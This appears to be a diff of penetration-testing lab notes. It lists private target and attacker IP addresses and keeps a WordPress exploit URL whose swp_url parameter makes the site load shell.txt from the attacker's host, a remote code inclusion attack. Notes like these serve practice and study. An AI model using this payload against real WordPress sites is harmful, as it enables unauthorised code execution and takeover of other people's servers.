@@ -1,7 +1,6 @@
 # IP: 192.168.68.123 
 # New-ip: 192.168.188.123
 
-# kali-ip: 192.168.49.188 
 http:// 192.168.188.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.188/shell.txt
 
 # Enumeration
